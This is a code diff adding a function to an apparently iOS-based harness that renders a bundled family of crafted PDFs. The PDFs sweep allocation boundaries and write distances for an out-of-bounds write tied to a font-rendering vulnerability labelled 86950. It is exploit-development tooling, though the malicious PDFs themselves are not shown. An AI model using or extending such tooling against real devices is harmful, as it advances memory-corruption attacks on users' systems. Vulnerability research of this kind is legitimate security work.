@@ -216,6 +216,35 @@ static void ModReportBundle(void) {
                  @"IPA, reinstall the newest one from the desktop");
 }
 
+// The family built with the CRASHING font's own structure (nine-level composite
+// chain, gen_font.py): k_dxNN_kMMMM.pdf, where DX sweeps the alloca/malloc
+// boundary of the coverage buffer and K the write distance in 4096-byte units.
+static void ModSweepK(void) {
+    NSString *bundle = [NSBundle mainBundle].bundlePath;
+    NSError *err = nil;
+    NSArray *all = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:bundle
+                                                                     error:&err];
+    NSMutableArray *fam = [NSMutableArray array];
+    for (NSString *f in all) {
+        if ([f hasPrefix:@"k_dx"] && [f hasSuffix:@".pdf"]) [fam addObject:f];
+    }
+    [fam sortUsingSelector:@selector(compare:)];
+    if (!fam.count) return;
+    AvePost([NSString stringWithFormat:@"86950 K-family: %d PDFs (DX 1..64 x K 0..1024, "
+             @"the crashing font's own structure)", (int)fam.count]);
+    for (NSString *f in fam) {
+        NSString *dist = [f substringWithRange:NSMakeRange(8, 6)];   // NN_kKK -> approx
+        NSString *tag = [NSString stringWithFormat:@"86950-K%@", dist];
+        NSString *r = ModThumbPDF(f, tag, 32);
+        AvePost([NSString stringWithFormat:@"86950K %@ -> %@", f, r]);
+        if (![r containsString:@"OK"] && ![r containsString:@"NULL"]) {
+            AvePost([NSString stringWithFormat:@"86950 K-family STOPPED on %@", f]);
+            return;
+        }
+    }
+    AvePost(@"86950 K-family: every PDF returned without a fault");
+}
+
 NSString *ModCVE86950(void) {
     // The raster-size sweep and the groom only repeat what we already know (the
     // trigger kills the process on the first render), and they burn the whole
@@ -232,6 +261,7 @@ NSString *ModCVE86950(void) {
         return [NSString stringWithFormat:@"86950: CONTROL failed (%@)", ctl];
     }
     ModSweepChain();
+    ModSweepK();
     int d = ModSweepDistance();
     if (d > 0)
         return [NSString stringWithFormat:@"86950: the OOB write reached live state at "
